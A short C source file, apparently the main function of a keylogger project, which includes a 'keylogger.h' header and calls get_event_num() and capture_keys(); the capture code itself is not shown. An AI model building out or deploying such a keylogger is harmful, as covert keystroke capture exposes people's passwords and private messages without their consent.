#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "keylogger.h"

int main(){


char event_num = get_event_num();
capture_keys(&event_num);

    return 0;
} 
